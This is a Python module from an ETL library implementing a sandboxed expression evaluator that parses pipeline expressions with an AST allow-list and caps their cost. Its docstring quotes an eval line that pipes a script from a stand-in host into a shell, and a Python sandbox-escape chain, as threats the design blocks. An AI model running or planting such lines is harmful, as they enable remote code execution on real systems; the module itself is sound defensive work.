"""A sandboxed expression evaluator for pipeline-authored logic.

Pipelines need expressions - a calculated column (``price * quantity``), a
business rule (``amount > 0 and currency in ALLOWED``), a branch condition
(``params.full_refresh``).  The obvious implementation is ``eval``, and it is
also a remote code execution vulnerability: a pipeline file is configuration
that travels through code review less rigorously than source, is often generated
by upstream systems, and in a large organisation is writable by more people than
the deployment is.

``eval("__import__('os').system('curl evil.sh | sh')")`` is one line.

This module parses the expression with :mod:`ast` and walks it with an explicit
allow-list of node types.  Anything not on the list - attribute access, lambda,
comprehension, walrus, f-string, import, dunder name - is rejected at *compile*
time, before any evaluation happens.  The design consequences:

* **Dotted access never reaches ``getattr``.**  ``params.force`` is *syntax* for
  a mapping lookup: :meth:`SafeExpression._eval` handles ``ast.Attribute`` by
  indexing a :class:`~collections.abc.Mapping` and returning ``None`` for
  anything else.  ``().__class__.__bases__[0].__subclasses__()`` - the canonical
  sandbox escape - therefore evaluates to ``None`` at the first hop instead of
  handing out the type graph, and dunder names are rejected at compile time.
* **Calls only to a fixed function table.**  The callee must be a bare name
  present in :data:`SAFE_FUNCTIONS`; ``getattr``, ``eval``, ``open`` and friends
  are simply absent.
* **Bounded cost.**  Expression length, AST node count, sequence-multiplication
  results and the size of anything a power produces are all capped, so neither
  ``"a" * 10**9`` nor ``pow(2, 5_000_000)`` can exhaust memory.  The power bound
  measures the *result*, not the exponent, so ``1.05 ** 240`` - compound interest
  over twenty years - is still an ordinary calculation.

Compiled expressions are cached, so evaluating a rule over a million rows parses
once.
"""

from __future__ import annotations

import ast
import math
import operator
import re
from collections.abc import Callable, Mapping
from datetime import datetime
from decimal import Decimal
from typing import Any, Final

from ironflow.core.errors import ConfigurationError, TransformationError

MAX_EXPRESSION_LENGTH: Final = 2000
MAX_AST_NODES: Final = 400
MAX_SEQUENCE_RESULT: Final = 1_000_000
#: Bit length a power may produce. 4096 bits is a 1233-digit integer: past any
#: value an ETL column plausibly holds, and deliberately below CPython's own
#: 4300-digit int-to-str limit, so a number this evaluator permits can still be
#: written to a CSV or a JSON document rather than failing later at the sink.
MAX_POWER_RESULT_BITS: Final = 4096

_BIN_OPS: Final[dict[type[ast.operator], Callable[[Any, Any], Any]]] = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}

_CMP_OPS: Final[dict[type[ast.cmpop], Callable[[Any, Any], Any]]] = {
    ast.Eq: operator.eq,
    ast.NotEq: operator.ne,
    ast.Lt: operator.lt,
    ast.LtE: operator.le,
    ast.Gt: operator.gt,
    ast.GtE: operator.ge,
    ast.In: lambda a, b: a in b,
    ast.NotIn: lambda a, b: a not in b,
    ast.Is: operator.is_,
    ast.IsNot: operator.is_not,
}

_UNARY_OPS: Final[dict[type[ast.unaryop], Callable[[Any], Any]]] = {
    ast.UAdd: operator.pos,
    ast.USub: operator.neg,
    ast.Not: operator.not_,
}

#: Node types the evaluator understands.  Everything else is rejected.
_ALLOWED_NODES: Final[tuple[type[ast.AST], ...]] = (
    ast.Expression,
    ast.Constant,
    ast.Name,
    ast.Load,
    ast.BinOp,
    ast.UnaryOp,
    ast.BoolOp,
    ast.Compare,
    ast.IfExp,
    ast.Call,
    ast.List,
    ast.Tuple,
    ast.Dict,
    ast.Set,
    ast.Subscript,
    ast.Attribute,
    ast.Slice,
    ast.And,
    ast.Or,
    *_BIN_OPS,
    *_CMP_OPS,
    *_UNARY_OPS,
)


# --------------------------------------------------------------------------- #
# Function table
# --------------------------------------------------------------------------- #
def _safe_len(value: Any) -> int:
    return len(value)


def _coalesce(*values: Any) -> Any:
    """First non-null argument (SQL ``COALESCE``)."""
    for value in values:
        if value is not None:
            return value
    return None


def _to_int(value: Any, default: int | None = None) -> int | None:
    try:
        if isinstance(value, str):
            value = value.strip().replace(",", "")
        return int(float(value))
    except (TypeError, ValueError):
        return default


def _to_float(value: Any, default: float | None = None) -> float | None:
    try:
        if isinstance(value, str):
            value = value.strip().replace(",", "")
        return float(value)
    except (TypeError, ValueError):
        return default


def _to_str(value: Any) -> str:
    return "" if value is None else str(value)


def _regex_match(pattern: str, value: Any) -> bool:
    if value is None:
        return False
    if len(pattern) > 200:
        raise TransformationError("regex pattern is too long")
    return bool(re.search(pattern, str(value)))


def _safe_round(value: Any, digits: int = 0) -> Any:
    number = _to_float(value)
    return None if number is None else round(number, min(abs(int(digits)), 12))


def _date_parse(value: Any, fmt: str | None = None) -> datetime | None:
    if value is None:
        return None
    if isinstance(value, datetime):
        return value
    text = str(value).strip()
    if not text:
        return None
    try:
        return datetime.strptime(text, fmt) if fmt else datetime.fromisoformat(text)
    except (TypeError, ValueError):
        return None


def _date_format(value: Any, fmt: str) -> str | None:
    """Reformat a parsed date; ``None`` when the value does not parse."""
    parsed = _date_parse(value)
    return parsed.strftime(fmt) if parsed is not None else None


def _date_part(value: Any, part: str) -> int | None:
    """Extract ``year``/``month``/``day``, parsing once rather than twice."""
    parsed = _date_parse(value)
    return int(getattr(parsed, part)) if parsed is not None else None


def _days_between(later: Any, earlier: Any) -> int | None:
    end, start = _date_parse(later), _date_parse(earlier)
    if end is None or start is None:
        return None
    return (end - start).days


def _safe_pow(base: Any, exponent: Any) -> Any:
    """``pow()`` under the same bound the ``**`` operator carries.

    The function table was a second, unguarded route to the identical
    computation: the interpreter sized the result of an :class:`ast.Pow` node,
    while ``pow(2, 5_000_000)`` went straight through and built a
    five-million-bit integer in under a second.
    """
    if _is_huge_power(base, exponent):
        raise TransformationError(
            "exponent produces a number larger than the size limit",
            context={"limit_bits": MAX_POWER_RESULT_BITS},
        )
    return pow(base, exponent)


def _safe_mul_guard(result: Any) -> Any:
    """Reject sequence results large enough to be a memory-exhaustion attempt."""
    if isinstance(result, (str, bytes, list, tuple)) and len(result) > MAX_SEQUENCE_RESULT:
        raise TransformationError(
            "expression produced an oversized value",
            context={"limit": MAX_SEQUENCE_RESULT},
        )
    return result


SAFE_FUNCTIONS: Final[dict[str, Callable[..., Any]]] = {
    # numeric
    "abs": abs,
    "min": min,
    "max": max,
    "sum": sum,
    "round": _safe_round,
    "floor": math.floor,
    "ceil": math.ceil,
    "sqrt": math.sqrt,
    "pow": _safe_pow,
    # casting
    "int": _to_int,
    "float": _to_float,
    "str": _to_str,
    "bool": bool,
    "decimal": lambda v: Decimal(str(v)) if v is not None else None,
    # strings
    "len": _safe_len,
    "lower": lambda v: _to_str(v).lower(),
    "upper": lambda v: _to_str(v).upper(),
    "strip": lambda v, chars=None: _to_str(v).strip(chars),
    "replace": lambda v, old, new: _to_str(v).replace(old, new),
    "startswith": lambda v, p: _to_str(v).startswith(p),
    "endswith": lambda v, p: _to_str(v).endswith(p),
    "contains": lambda v, p: p in _to_str(v),
    "split": lambda v, sep=None: _to_str(v).split(sep),
    "join": lambda sep, items: str(sep).join(str(i) for i in items),
    "concat": lambda *parts: "".join(_to_str(p) for p in parts),
    "regex_match": _regex_match,
    "slice": lambda v, start, end=None: _to_str(v)[start:end],
    # null handling
    "coalesce": _coalesce,
    "is_null": lambda v: v is None or (isinstance(v, str) and not v.strip()),
    "is_not_null": lambda v: not (v is None or (isinstance(v, str) and not v.strip())),
    "default": lambda v, d: d if v is None else v,
    # dates
    "date_parse": _date_parse,
    "date_format": _date_format,
    "year": lambda v: _date_part(v, "year"),
    "month": lambda v: _date_part(v, "month"),
    "day": lambda v: _date_part(v, "day"),
    "days_between": _days_between,
    # collections
    "keys": lambda m: list(m.keys()) if isinstance(m, Mapping) else [],
    "values": lambda m: list(m.values()) if isinstance(m, Mapping) else [],
    "get": lambda m, k, d=None: m.get(k, d) if isinstance(m, Mapping) else d,
    "any": any,
    "all": all,
    "sorted": lambda seq, reverse=False: sorted(seq, reverse=bool(reverse)),
}

SAFE_CONSTANTS: Final[dict[str, Any]] = {
    "True": True,
    "False": False,
    "None": None,
    "PI": math.pi,
    "E": math.e,
}


# --------------------------------------------------------------------------- #
# Compilation
# --------------------------------------------------------------------------- #
class SafeExpression:
    """A parsed, validated and cached expression."""

    __slots__ = ("_functions", "_tree", "source")

    def __init__(self, source: str, *, functions: Mapping[str, Callable[..., Any]] | None = None):
        if not isinstance(source, str) or not source.strip():
            raise ConfigurationError("expression must be a non-empty string")
        if len(source) > MAX_EXPRESSION_LENGTH:
            raise ConfigurationError(
                "expression exceeds the maximum length",
                context={"length": len(source), "limit": MAX_EXPRESSION_LENGTH},
            )
        self.source = source
        self._functions = {**SAFE_FUNCTIONS, **(functions or {})}
        self._tree = self._compile(source)

    def _compile(self, source: str) -> ast.Expression:
        try:
            tree = ast.parse(source, mode="eval")
        except SyntaxError as exc:
            raise ConfigurationError(
                "expression has a syntax error",
                context={"expression": source[:120], "detail": exc.msg},
            ) from exc

        nodes = list(ast.walk(tree))
        if len(nodes) > MAX_AST_NODES:
            raise ConfigurationError(
                "expression is too complex",
                context={"nodes": len(nodes), "limit": MAX_AST_NODES},
            )

        for node in nodes:
            if not isinstance(node, _ALLOWED_NODES):
                raise ConfigurationError(
                    f"expression uses a forbidden construct: {type(node).__name__}",
                    context={"expression": source[:120]},
                )
            if isinstance(node, ast.Name) and node.id.startswith("_"):
                raise ConfigurationError(
                    "names starting with '_' are not allowed in expressions",
                    context={"name": node.id},
                )
            if isinstance(node, ast.Attribute) and node.attr.startswith("_"):
                # Blocks ``__class__``/``__globals__`` before evaluation even runs.
                raise ConfigurationError(
                    "attributes starting with '_' are not allowed in expressions",
                    context={"attribute": node.attr},
                )
            if isinstance(node, ast.Call):
                if not isinstance(node.func, ast.Name):
                    raise ConfigurationError(
                        "only direct calls to allow-listed functions are permitted"
                    )
                if node.func.id not in self._functions:
                    raise ConfigurationError(
                        f"unknown function {node.func.id!r} in expression",
                        context={"available": sorted(self._functions)[:40]},
                    )
                if any(kw.arg is None for kw in node.keywords):
                    raise ConfigurationError("**kwargs unpacking is not allowed")
                if any(isinstance(a, ast.Starred) for a in node.args):
                    raise ConfigurationError("*args unpacking is not allowed")
        return tree

    # -- evaluation -------------------------------------------------------- #
    def evaluate(self, names: Mapping[str, Any] | None = None) -> Any:
        """Evaluate against a name mapping."""
        scope = dict(SAFE_CONSTANTS)
        if names:
            scope.update(names)
        try:
            return self._eval(self._tree.body, scope)
        except TransformationError:
            raise
        except ZeroDivisionError:
            return None  # SQL semantics: division by zero yields NULL, not a crash
        # OverflowError is in the list because arithmetic can reach it without
        # tripping the power guard - `(1/3) ** -10_000_000` is a float that grows
        # rather than an integer that does. Letting it escape would abort the
        # whole run instead of routing the record to the `on_error` policy.
        except (
            TypeError,
            ValueError,
            KeyError,
            IndexError,
            AttributeError,
            OverflowError,
        ) as exc:
            raise TransformationError(
                "expression evaluation failed",
                context={"expression": self.source[:120], "detail": str(exc)[:200]},
                cause=exc,
            ) from exc

    def evaluate_bool(self, names: Mapping[str, Any] | None = None) -> bool:
        return bool(self.evaluate(names))

    # -- interpreter ------------------------------------------------------- #
    def _eval(self, node: ast.AST, scope: Mapping[str, Any]) -> Any:
        if isinstance(node, ast.Constant):
            return node.value

        if isinstance(node, ast.Name):
            return _resolve_name(node.id, scope, self.source)

        if isinstance(node, ast.BinOp):
            func = _BIN_OPS[type(node.op)]
            left = self._eval(node.left, scope)
            right = self._eval(node.right, scope)
            if isinstance(node.op, ast.Pow) and _is_huge_power(left, right):
                raise TransformationError(
                    "exponent produces a number larger than the size limit",
                    context={"limit_bits": MAX_POWER_RESULT_BITS},
                )
            _check_operand_types(node.op, left, right)
            return _safe_mul_guard(func(left, right))

        if isinstance(node, ast.UnaryOp):
            return _UNARY_OPS[type(node.op)](self._eval(node.operand, scope))

        if isinstance(node, ast.BoolOp):
            # Short-circuit so ``x is not None and x > 5`` behaves as written.
            if isinstance(node.op, ast.And):
                result: Any = True
                for value in node.values:
                    result = self._eval(value, scope)
                    if not result:
                        return result
                return result
            result = False
            for value in node.values:
                result = self._eval(value, scope)
                if result:
                    return result
            return result

        if isinstance(node, ast.Compare):
            left = self._eval(node.left, scope)
            for op, comparator in zip(node.ops, node.comparators, strict=True):
                right = self._eval(comparator, scope)
                if not _CMP_OPS[type(op)](left, right):
                    return False
                left = right
            return True

        if isinstance(node, ast.IfExp):
            if self._eval(node.test, scope):
                return self._eval(node.body, scope)
            return self._eval(node.orelse, scope)

        if isinstance(node, ast.Call):
            assert isinstance(node.func, ast.Name)
            func = self._functions[node.func.id]
            args = [self._eval(a, scope) for a in node.args]
            kwargs = {kw.arg: self._eval(kw.value, scope) for kw in node.keywords if kw.arg}
            return _safe_mul_guard(func(*args, **kwargs))

        if isinstance(node, ast.List):
            return [self._eval(e, scope) for e in node.elts]
        if isinstance(node, ast.Tuple):
            return tuple(self._eval(e, scope) for e in node.elts)
        if isinstance(node, ast.Set):
            return {self._eval(e, scope) for e in node.elts}
        if isinstance(node, ast.Dict):
            return {
                self._eval(k, scope) if k is not None else None: self._eval(v, scope)
                for k, v in zip(node.keys, node.values, strict=True)
            }

        if isinstance(node, ast.Subscript):
            container = self._eval(node.value, scope)
            index = self._eval(node.slice, scope)
            return _subscript(container, index)

        if isinstance(node, ast.Attribute):
            # Mapping lookup only - ``getattr`` is never called, so no Python
            # object can be reached through dotted syntax.
            container = self._eval(node.value, scope)
            return container.get(node.attr) if isinstance(container, Mapping) else None

        if isinstance(node, ast.Slice):
            return slice(
                self._eval(node.lower, scope) if node.lower else None,
                self._eval(node.upper, scope) if node.upper else None,
                self._eval(node.step, scope) if node.step else None,
            )

        raise ConfigurationError(  # pragma: no cover - unreachable after compile check
            f"unsupported expression node {type(node).__name__}"
        )


def _subscript(container: Any, index: Any) -> Any:
    """Missing keys/indices yield ``None`` instead of raising.

    SQL-like semantics: an absent column in one record should not abort a
    million-row load.  Genuine type errors still surface.
    """
    if container is None:
        return None
    try:
        return container[index]
    except (KeyError, IndexError):
        return None


def _resolve_name(name: str, scope: Mapping[str, Any], source: str) -> Any:
    """Resolve a bare name against the scope.

    An unknown name is an error rather than ``None``: a typo in a column name
    should fail loudly at the first record, not silently null out a whole
    calculated field for an entire load.
    """
    if name in scope:
        return scope[name]
    raise TransformationError(
        f"unknown name {name!r} in expression",
        context={"expression": source[:120], "available": sorted(scope)[:30]},
    )


def _check_operand_types(op: ast.operator, left: Any, right: Any) -> None:
    """Reject arithmetic that Python allows but that silently corrupts data.

    ``"12.50" * 2`` is valid Python and evaluates to ``"12.5012.50"``.  In an
    ETL expression over a CSV column that has not been cast yet, that is never
    what the author meant, and it produces a plausible-looking wrong value that
    survives all the way into the warehouse.  Failing here routes the record to
    the ``on_error`` policy - null, quarantine or abort - instead.

    String ``+`` string is left alone: concatenation is a legitimate intent.
    """
    left_is_text = isinstance(left, str)
    right_is_text = isinstance(right, str)
    if not (left_is_text or right_is_text):
        return

    if isinstance(op, ast.Add):
        if left_is_text and right_is_text:
            return
        raise TransformationError(
            "cannot add a string and a number; cast the column first or use concat() to join text",
            context={"left": type(left).__name__, "right": type(right).__name__},
        )

    raise TransformationError(
        f"arithmetic ({type(op).__name__}) is not defined for text values; "
        "cast the column to a number first",
        context={"left": type(left).__name__, "right": type(right).__name__},
    )


def _is_huge_power(base: Any, exponent: Any) -> bool:
    """True when ``base ** exponent`` would build an absurdly large number.

    Capping the *exponent* is the obvious guard and the wrong one: it also
    rejects ``1.05 ** 240``, which is twenty years of monthly compound interest
    and an entirely ordinary thing to write in a derived column.  Sizing the
    *result* keeps that working and still rejects ``2 ** 10_000_000``, because
    ``exponent * log2(|base|)`` is the bit length of the answer and can be
    computed without building it.

    A magnitude of one or less cannot grow, and a negative exponent yields a
    float that underflows towards zero rather than a large integer, so neither
    needs a bound.
    """
    try:
        magnitude = abs(float(base))
        power = float(exponent)
    except (TypeError, ValueError, OverflowError):
        return False
    if power <= 0 or magnitude <= 1.0:
        return False
    try:
        return power * math.log2(magnitude) > MAX_POWER_RESULT_BITS
    except (ValueError, OverflowError):  # pragma: no cover - defensive
        return True


# --------------------------------------------------------------------------- #
# Cache + convenience API
# --------------------------------------------------------------------------- #
_CACHE: dict[str, SafeExpression] = {}
_CACHE_LIMIT = 1024


def compile_expression(source: str) -> SafeExpression:
    """Compile with a process-wide cache (bounded to avoid unbounded growth)."""
    cached = _CACHE.get(source)
    if cached is not None:
        return cached
    expression = SafeExpression(source)
    if len(_CACHE) >= _CACHE_LIMIT:
        _CACHE.clear()
    _CACHE[source] = expression
    return expression


def evaluate(source: str, names: Mapping[str, Any] | None = None) -> Any:
    """Compile (cached) and evaluate ``source``."""
    return compile_expression(source).evaluate(names)


def evaluate_condition(source: str, names: Mapping[str, Any] | None = None) -> bool:
    """Evaluate ``source`` as a boolean gate."""
    return compile_expression(source).evaluate_bool(names)


def record_scope(
    record: Mapping[str, Any],
    *,
    params: Mapping[str, Any] | None = None,
    state: Mapping[str, Any] | None = None,
    extra: Mapping[str, Any] | None = None,
) -> dict[str, Any]:
    """Build the name scope used when evaluating expressions over a record.

    Columns are bound directly (``amount``) *and* under ``row`` (``row["amount"]``)
    so that a column whose name collides with a function still has an
    unambiguous form.
    """
    scope: dict[str, Any] = dict(record)
    scope["row"] = record
    scope["params"] = dict(params or {})
    scope["state"] = dict(state or {})
    if extra:
        scope.update(extra)
    return scope


__all__ = [
    "SAFE_FUNCTIONS",
    "SafeExpression",
    "compile_expression",
    "evaluate",
    "evaluate_condition",
    "record_scope",
]
